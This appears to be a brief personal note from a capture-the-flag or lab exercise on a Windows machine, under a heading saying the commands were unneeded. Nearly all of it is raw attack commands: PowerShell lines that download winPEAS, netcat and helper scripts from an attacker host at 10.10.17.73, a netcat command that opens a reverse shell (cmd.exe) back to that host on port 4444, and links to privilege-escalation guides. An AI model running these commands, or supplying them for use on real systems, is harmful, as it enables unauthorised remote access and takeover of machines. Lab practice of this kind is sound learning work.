### No need for any of them
```
powershell.exe -c "Invoke-WebRequest -OutFile winPEAS.exe http://10.10.17.73/winPEASx64.exe"
powershell.exe -c "Invoke-WebRequest -OutFile nc.exe http://10.10.17.73/nc.exe"
powershell.exe -c "Invoke-WebRequest -OutFile nc.bat http://10.10.17.73/nc.bat"
powershell.exe -c "Invoke-WebRequest -OutFile sudo.ps1 http://10.10.17.73/sudo.ps1"

powershell.exe C:\Users\kostas\Desktop\nc.exe 10.10.17.73 4444 -e cmd.exe
powershell.exe C:\Users\kostas\Desktop\sudo.ps1
powershell -c "Get-Service"

https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#sudo
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
```

### Don't look over. Far too easy.